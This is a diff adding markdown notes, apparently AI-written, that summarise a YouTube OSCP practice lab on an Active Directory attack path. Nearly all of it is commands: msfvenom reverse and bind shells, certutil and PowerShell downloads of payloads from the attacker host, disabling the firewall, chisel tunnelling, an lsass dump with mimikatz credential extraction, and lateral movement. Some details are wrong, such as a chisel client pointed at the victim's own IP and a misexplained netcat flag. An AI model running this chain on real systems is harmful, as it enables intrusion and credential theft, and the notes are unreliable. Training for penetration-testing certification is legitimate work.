@@ -1,0 +1,342 @@
+Here are OSCP-style notes and commands based on the provided YouTube video, "OSCP Practice Lab: Active Directory Attack Path \#2 (Back to the Basics)" [[00:00](http://www.youtube.com/watch?v=jBfdlLybMek&t=0)]:
+
+-----
+
+## 🚀 Initial Setup and Reconnaissance
+
+To start your penetration test, you'll first set up your environment and perform initial reconnaissance to map out the network.
+
+### 📁 Workspace Setup
+
+Before starting, create a dedicated folder for your target to keep all your findings organized.
+
+  * **Command:**
+    ```bash
+    mkdir ad
+    cd ad
+    mkdir enum
+    ```
+    *Explanation:* Creates a main directory `ad` for the Active Directory lab and a subdirectory `enum` for enumeration results [[01:00](http://www.youtube.com/watch?v=jBfdlLybMek&t=60)].
+
+### 🌐 VPN Connection and Network Understanding
+
+You'll connect to the lab VPN using provided credentials and understand the network topology. The video describes a setup where your Kali box connects via VPN to a 172.16.1.1/24 subnet, which then routes to an outside 192.168.0.0/24 subnet (with `ms01` at 192.168.100.201) and an inside 10.10.1.0/24 subnet (with `dc01` at 10.10.1.200 and `ms02` at 10.10.1.202) [[01:11](http://www.youtube.com/watch?v=jBfdlLybMek&t=71)].
+
+### ✏️ Editing the Hosts File
+
+To easily reference target machines by name, you'll modify your `/etc/hosts` file.
+
+  * **Command:**
+    ```bash
+    sudo nano /etc/hosts
+    ```
+  * **Additions to `/etc/hosts`:**
+    ```
+    192.168.100.201 ms01
+    10.10.1.200 dc01
+    10.10.1.202 ms02
+    ```
+    *Explanation:* Maps IP addresses to hostnames for easier access during testing [[04:39](http://www.youtube.com/watch?v=jBfdlLybMek&t=279)].
+
+### 🔍 Initial Connectivity Check
+
+Perform a basic ping to check if the target machines are reachable and if any firewalls are blocking ICMP traffic.
+
+  * **Command:**
+    ```bash
+    ping ms01
+    ```
+    *Explanation:* Verifies network connectivity to the target host `ms01` [[05:59](http://www.youtube.com/watch?v=jBfdlLybMek&t=359)].
+
+-----
+
+## 🚪 Port Scanning and Service Enumeration
+
+Once network connectivity is established, the next step is to identify open ports and running services on the target machines.
+
+### 🎯 Nmap Scans
+
+Nmap is essential for comprehensive port scanning. The video demonstrates different Nmap flags for varying levels of detail.
+
+  * **Initial Quick Scan (TCP SYN Scan):**
+
+    ```bash
+    nmap -sS -p- ms01 -oN enum/ms01-allports-quick.nmap
+    ```
+
+    *Explanation:* Performs a stealthy SYN scan (`-sS`) on all 65535 ports (`-p-`) and saves the output to `ms01-allports-quick.nmap` in the `enum` directory [[09:54](http://www.youtube.com/watch?v=jBfdlLybMek&t=594)].
+
+  * **Detailed Service Version Scan on Open Ports:**
+
+    ```bash
+    nmap -sC -sV -p 80,135,139,445,3389,8094 ms01 -oN enum/ms01-ports-detail.nmap
+    ```
+
+    *Explanation:* Runs default scripts (`-sC`) and detects service versions (`-sV`) on identified open ports (80, 135, 139, 445, 3389, 8094) [[10:35](http://www.youtube.com/watch?v=jBfdlLybMek&t=635)].
+
+  * **UDP Scan:**
+
+    ```bash
+    sudo nmap -sU -p 53,161 --min-rate 1000 -oN enum/ms01-udp.nmap ms01
+    ```
+
+    *Explanation:* Scans common UDP ports (53 for DNS, 161 for SNMP) on `ms01`, using `--min-rate 1000` to speed up the scan and saves output to `ms01-udp.nmap` [[11:00](http://www.youtube.com/watch?v=jBfdlLybMek&t=660)].
+
+-----
+
+## 🕸️ Web Enumeration
+
+After identifying open web ports, you'll enumerate web directories and files to uncover potential vulnerabilities or information disclosures.
+
+### 📂 Gobuster Directory Bruteforcing
+
+Gobuster is used to find hidden directories and files on web servers.
+
+  * **Using `common.txt` wordlist:**
+
+    ```bash
+    gobuster dir -u http://ms01 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -o enum/gobuster_common.log
+    ```
+
+    *Explanation:* Performs directory brute-forcing against `http://ms01` using a common wordlist (`directory-list-2.3-small.txt`), with 50 threads (`-t 50`), and saves results to `gobuster_common.log` [[12:50](http://www.youtube.com/watch?v=jBfdlLybMek&t=770)].
+
+  * **Using a larger wordlist (e.g., `big.txt`):**
+
+    ```bash
+    gobuster dir -u http://ms01 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o enum/gobuster_big.log
+    ```
+
+    *Explanation:* Similar to the above, but uses a larger wordlist (`directory-list-2.3-medium.txt`) if the initial scan yields no results [[13:29](http://www.youtube.com/watch?v=jBfdlLybMek&t=809)].
+
+### 🕵️‍♂️ Manual Web Server Inspection with Curl
+
+Sometimes, automated tools miss information that manual inspection can reveal. `curl` is useful for checking source code and responses directly.
+
+  * **Basic `curl` request:**
+    ```bash
+    curl http://ms01
+    ```
+    *Explanation:* Retrieves the HTML content of the `ms01` web server, allowing for manual review of the source code [[21:35](http://www.youtube.com/watch?v=jBfdlLybMek&t=1295)].
+    *Example Output Snippet:*
+    ```html
+    <h1>Gail's Blog</h1>
+    <p>If you like me get in touch! Feel free to reach out at Gail@oscp.lab</p>
+    ```
+    *Note:* This example output helps in identifying the domain name `oscp.lab` and a potential username `Gail` [[22:54](http://www.youtube.com/watch?v=jBfdlLybMek&t=1374)]. Once the domain is found, update your `/etc/hosts` file with `dc01.oscp.lab` and `ms02.oscp.lab` [[02:29:58](http://www.youtube.com/watch?v=jBfdlLybMek&t=8998)].
+
+-----
+
+## 🐚 Achieving a Shell
+
+After enumeration, the goal is to gain a shell on the target system. This section covers various methods, including reverse and bind shells.
+
+### 📦 Payload Generation with MSFVenom
+
+MSFVenom is used to create malicious payloads for various purposes.
+
+  * **Windows Reverse Shell (64-bit):**
+
+    ```bash
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f exe -o winrev.exe
+    ```
+
+    *Explanation:* Generates a 64-bit Windows Meterpreter reverse TCP payload (`windows/x64/meterpreter/reverse_tcp`) that connects back to `LHOST` (your attacking machine's IP) on `LPORT` (443 in this example), formatted as an executable (`.exe`) and saved as `winrev.exe` [[24:28](http://www.youtube.com/watch?v=jBfdlLybMek&t=1468)].
+
+  * **Windows Bind Shell (64-bit):**
+
+    ```bash
+    msfvenom -p windows/x64/shell_bind_tcp LPORT=4440 -f exe -o winbind4440.exe
+    ```
+
+    *Explanation:* Creates a 64-bit Windows bind TCP shell payload (`windows/x64/shell_bind_tcp`) that listens on the target machine on `LPORT` (4440 in this example), formatted as an executable (`.exe`) and saved as `winbind4440.exe` [[02:44:04](http://www.youtube.com/watch?v=jBfdlLybMek&t=9844)].
+
+### 💻 Setting up a Listener with Netcat or Metasploit
+
+To catch reverse shells, you'll need a listener.
+
+  * **Netcat Listener:**
+
+    ```bash
+    nc -lvnp 443
+    ```
+
+    *Explanation:* Sets up a Netcat listener on port 443, listening verbosely (`-v`), numerically (`-n`), and persistently (`-p`) [[26:55](http://www.youtube.com/watch?v=jBfdlLybMek&t=1615)].
+
+  * **Metasploit Listener (for Meterpreter payloads):**
+
+    ```bash
+    msfconsole
+    use exploit/multi/handler
+    set PAYLOAD windows/x64/meterpreter/reverse_tcp
+    set LHOST 10.10.14.1
+    set LPORT 443
+    exploit
+    ```
+
+    *Explanation:* Starts Metasploit, uses the `multi/handler` exploit module, configures it to catch the `windows/x64/meterpreter/reverse_tcp` payload, sets the listening host (`LHOST`) to your Kali IP, and the listening port (`LPORT`) [[27:00](http://www.youtube.com/watch?v=jBfdlLybMek&t=1620)].
+
+### 📤 File Transfer Methods
+
+Once you have initial access, you'll often need to transfer payloads or other tools to the target.
+
+  * **Python Simple HTTP Server:**
+
+    ```bash
+    python3 -m http.server 80
+    ```
+
+    *Explanation:* Starts a simple web server on port 80 in the current directory, allowing the target to download files [[26:00](http://www.youtube.com/watch?v=jBfdlLybMek&t=1560)].
+
+  * **`certutil.exe` (on Windows target):**
+
+    ```powershell
+    certutil.exe -urlcache -f http://<YOUR_KALI_IP>/winrev.exe winrev.exe
+    ```
+
+    *Explanation:* On the Windows target, this command downloads `winrev.exe` from your Python web server [[28:10](http://www.youtube.com/watch?v=jBfdlLybMek&t=1690)].
+
+  * **SMB Server (for transferring files via SMB):**
+
+    ```bash
+    sudo smbserver.py share /path/to/your/files
+    ```
+
+    *Explanation:* Sets up an SMB share using `impacket-smbserver` to transfer files [[30:00](http://www.youtube.com/watch?v=jBfdlLybMek&t=1800)].
+
+### 🛡️ Disabling Firewall (on Windows target)
+
+Often, the firewall on the target will block inbound connections for bind shells. You might need to disable it.
+
+  * **Command:**
+    ```powershell
+    netsh advfirewall set allprofiles state off
+    ```
+    *Explanation:* Disables the Windows firewall across all profiles. This is often done for bind shells or to prevent interference during testing [[02:43:51](http://www.youtube.com/watch?v=jBfdlLybMek&t=9831)].
+
+-----
+
+## ➡️ Port Forwarding
+
+In internal networks, port forwarding is crucial for reaching machines that are not directly accessible from your attacking machine.
+
+### 🔗 Chisel for SOCKS Proxy and Port Forwarding
+
+Chisel is a powerful tool for creating a SOCKS proxy and forwarding ports.
+
+  * **Chisel Server (on Kali):**
+
+    ```bash
+    ./chisel server -p 9001 --reverse
+    ```
+
+    *Explanation:* Starts a Chisel server on port 9001 on your Kali machine, enabling reverse connections [[01:13:30](http://www.youtube.com/watch?v=jBfdlLybMek&t=4410)].
+
+  * **Chisel Client (on compromised host, e.g., `ms01`):**
+
+    ```bash
+    ./chisel.exe client 192.168.100.201:9001 R:socks
+    ```
+
+    *Explanation:* The compromised host (`ms01`) connects to your Kali Chisel server, setting up a reverse SOCKS proxy (`R:socks`). This allows your Kali machine to route traffic through `ms01` to internal networks [[01:13:30](http://www.youtube.com/watch?v=jBfdlLybMek&t=4410)].
+
+  * **Configuring Proxychains:**
+    Edit `/etc/proxychains4.conf` (or `proxychains.conf`) and add the SOCKS proxy entry.
+
+    ```
+    socks5 127.0.0.1 1080
+    ```
+
+    *Explanation:* Directs `proxychains` to use the local SOCKS5 proxy established by Chisel [[01:14:00](http://www.youtube.com/watch?v=jBfdlLybMek&t=4440)].
+
+  * **Using Proxychains with Nmap (example):**
+
+    ```bash
+    proxychains4 nmap -sT -Pn -p 80,445,3389 10.10.1.202 -oN enum/ms02-proxied.nmap
+    ```
+
+    *Explanation:* Runs Nmap through the `proxychains` tunnel to scan an internal host (`10.10.1.202`), which is otherwise unreachable [[01:14:50](http://www.youtube.com/watch?v=jBfdlLybMek&t=4490)].
+
+-----
+
+## 🎣 Lateral Movement
+
+Once you have a foothold, you'll move laterally to other machines in the network to gain further access and elevate privileges.
+
+### 🔑 Evil-WinRM for PowerShell Remoting
+
+Evil-WinRM is a tool for interacting with Windows machines over WinRM.
+
+  * **Connecting with Evil-WinRM:**
+    ```bash
+    evil-winrm -i 10.10.1.202 -u <username> -p <password>
+    ```
+    *Explanation:* Connects to the target (`10.10.1.202`) using specified credentials (`<username>` and `<password>`) via WinRM [[01:21:00](http://www.youtube.com/watch?v=jBfdlLybMek&t=4860)].
+
+### 🧺 Credential Dumping
+
+To move laterally, you'll need credentials. Dumping credentials from memory or configuration files is a common technique.
+
+  * **Using `procdump.exe` (on Windows target):**
+
+    ```powershell
+    procdump.exe -accepteula -ma lsass.exe lsass.dmp
+    ```
+
+    *Explanation:* Dumps the `lsass.exe` process memory to `lsass.dmp`, which can then be analyzed for credentials [[01:31:00](http://www.youtube.com/watch?v=jBfdlLybMek&t=5460)].
+
+  * **Using `mimikatz` (on Kali) to extract credentials:**
+
+    ```bash
+    sekurlsa::minidump lsass.dmp
+    sekurlsa::logonpasswords full
+    ```
+
+    *Explanation:* `mimikatz` is used to load the `lsass.dmp` file and extract plaintext passwords, NTLM hashes, and Kerberos tickets [[01:32:00](http://www.youtube.com/watch?v=jBfdlLybMek&t=5520)].
+
+### 🌳 Active Directory Enumeration with `enum4linux`
+
+`enum4linux` can be used to enumerate users, groups, shares, and other information from Windows systems.
+
+  * **Basic `enum4linux` scan:**
+    ```bash
+    enum4linux -a 10.10.1.200
+    ```
+    *Explanation:* Performs an all-encompassing enumeration (`-a`) against the domain controller (`10.10.1.200`) [[01:38:00](http://www.youtube.com/watch?v=jBfdlLybMek&t=5880)].
+
+### 💻 RDP Connection
+
+Remote Desktop Protocol (RDP) allows you to connect to a graphical desktop of a Windows machine.
+
+  * **Connecting with `xfreerdp` (on Kali):**
+    ```bash
+    xfreerdp /v:10.10.1.202 /u:<username> /p:<password>
+    ```
+    *Explanation:* Establishes an RDP connection to the target (`10.10.1.202`) using provided credentials [[02:30:00](http://www.youtube.com/watch?v=jBfdlLybMek&t=9000)].
+
+-----
+
+## 🎭 Other Useful Commands and Techniques
+
+  * **PowerShell Web Request (on Windows target):**
+
+    ```powershell
+    Invoke-WebRequest -Uri http://<YOUR_KALI_IP>/tool.exe -OutFile tool.exe
+    ```
+
+    *Explanation:* Downloads a file from a web server using PowerShell [[30:45](http://www.youtube.com/watch?v=jBfdlLybMek&t=1845)].
+
+  * **Netcat for Bind Shell Connection (on Kali):**
+
+    ```bash
+    nc -nv 10.10.1.202 4440
+    ```
+
+    *Explanation:* Connects to a bind shell listening on `10.10.1.202` on port 4440 [[02:46:21](http://www.youtube.com/watch?v=jBfdlLybMek&t=9981)].
+
+-----
+
+Here are the YouTube URLs mentioned in the response:
+
+  * [OSCP Practice Lab: Active Directory Attack Path \#2 (Back to the Basics)](http://www.youtube.com/watch?v=jBfdlLybMek)
+
+http://googleusercontent.com/youtube_content/0
